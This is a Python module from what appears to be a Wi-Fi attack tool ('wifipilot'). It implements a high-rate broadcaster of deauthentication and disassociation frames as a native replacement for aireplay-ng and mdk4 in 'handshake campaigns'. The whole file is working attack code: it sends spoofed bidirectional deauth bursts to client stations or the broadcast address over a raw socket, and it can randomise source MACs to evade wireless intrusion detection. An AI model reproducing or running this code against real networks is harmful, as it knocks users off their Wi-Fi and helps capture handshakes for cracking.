# SPDX-License-Identifier: Apache-2.0 OR BSD-3-Clause
"""Native high-rate deauthentication / disassociation broadcaster — replaces
``aireplay-ng -0`` and ``mdk4 d`` for the common targeted case wifipilot
uses during handshake campaigns: send short bursts of deauth and disassoc
frames, optionally to every client station discovered by the native scanner,
at an operator-controlled rate.

aireplay-ng spawns a separate process and prints ASCII art while sending;
this module sends frames directly on an AF_PACKET socket with rate control
built in, and it can rotate source MACs per burst to defeat basic WIDS
deauth-signature detection (though nothing prevents real 802.11w PMF from
blocking deauths; we log and skip when PMF is required — same as aireplay).
"""
from __future__ import annotations

import random
import socket
import threading
import time
from dataclasses import dataclass, field
from typing import List, Optional, Set

from . import ieee80211, radiotap
from .scanner import set_channel
from ..util import mac_norm


@dataclass
class DeauthStats:
    sent: int = 0
    bursts: int = 0
    start: float = field(default_factory=time.time)
    @property
    def rate(self) -> float:
        d = time.time() - self.start
        return self.sent / d if d > 0 else 0.0


def random_mac() -> bytes:
    b = [random.randint(0, 255) for _ in range(6)]
    b[0] = (b[0] & 0xfe) | 0x02
    return bytes(b)


class Deauther:
    """Targeted deauth/disassoc broadcaster."""

    def __init__(self, interface: str, bssid: str, channel: int,
                 clients: Optional[List[str]] = None,
                 broadcast: bool = True, count: int = 0,
                 burst_size: int = 5, interval: float = 0.10,
                 rate_per_sec: float = 0.0,     # 0 = as fast as interval allows
                 disassoc: bool = False,
                 spoof_mac: bool = False,
                 reason: int = ieee80211.REASON_CLASS3_FRAME,
                 stop_event: Optional[threading.Event] = None):
        self.interface = interface
        self.bssid = mac_norm(bssid)
        self.channel = channel
        self.clients: Set[str] = set(mac_norm(c) for c in (clients or []))
        self.broadcast = broadcast
        self.count = count
        self.burst_size = burst_size
        self.interval = interval
        self.rate_per_sec = rate_per_sec
        self.disassoc = disassoc
        self.spoof_mac = spoof_mac
        self.reason = reason
        self.stop_event = stop_event or threading.Event()
        self.stats = DeauthStats()
        self._sock: Optional[socket.socket] = None
        self._seq = 1

    # ------------------------------------------------------------------ #
    def open(self) -> bool:
        try:
            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            s.bind((self.interface, 0))
            self._sock = s
            return True
        except OSError:
            return False

    def close(self) -> None:
        self.stop_event.set()
        if self._sock:
            with contextlib.suppress(Exception):
                self._sock.close()
            self._sock = None

    # ------------------------------------------------------------------ #
    def add_client(self, mac: str) -> None:
        self.clients.add(mac_norm(mac))

    def remove_client(self, mac: str) -> None:
        self.clients.discard(mac_norm(mac))

    # ------------------------------------------------------------------ #
    def run(self, duration: Optional[float] = None) -> DeauthStats:
        set_channel(self.interface, self.channel)
        if not self.open():
            return self.stats
        start = time.time()
        sent = 0
        # Build base frames per target (clients) + broadcast once per spoof mac
        targets: List[str] = list(self.clients)
        if self.broadcast:
            targets.append("ff:ff:ff:ff:ff:ff")
        if not targets:
            return self.stats
        burst_gap = 1.0 / self.rate_per_sec if self.rate_per_sec > 0 else self.interval
        while not self.stop_event.is_set():
            src = random_mac() if self.spoof_mac else ieee80211.mac_to_bytes(self.bssid)
            for client in targets:
                frames = []
                for _ in range(self.burst_size):
                    if self.disassoc:
                        f = ieee80211.disassoc(client, ieee80211.mac_from_bytes(src),
                                              self.bssid, reason=self.reason,
                                              seq=self._seq & 0xFFF)
                    else:
                        # Send one from AP -> STA and one from STA -> AP
                        # (bidirectional deauth is what aireplay does).
                        f_ap = ieee80211.deauth(client, self.bssid, self.bssid,
                                                reason=self.reason,
                                                seq=self._seq & 0xFFF)
                        self._seq += 1
                        f_sta = ieee80211.deauth(self.bssid, client, self.bssid,
                                                 reason=self.reason,
                                                 seq=self._seq & 0xFFF)
                        frames.append(f_ap); frames.append(f_sta)
                        self._send(f_ap); self._send(f_sta)
                        sent += 2
                        continue
                    self._send(f)
                    sent += 1
                    self._seq += 1
            self.stats.sent = sent; self.stats.bursts += 1
            if self.count and sent >= self.count:
                break
            if duration and (time.time() - start) >= duration:
                break
            self.stop_event.wait(burst_gap)
        self.close()
        return self.stats

    def _send(self, frame: bytes) -> None:
        if not self._sock: return
        try:
            self._sock.send(radiotap.with_header(frame, rate_mbps=1.0,
                                                channel=self.channel))
        except OSError:
            pass


import contextlib
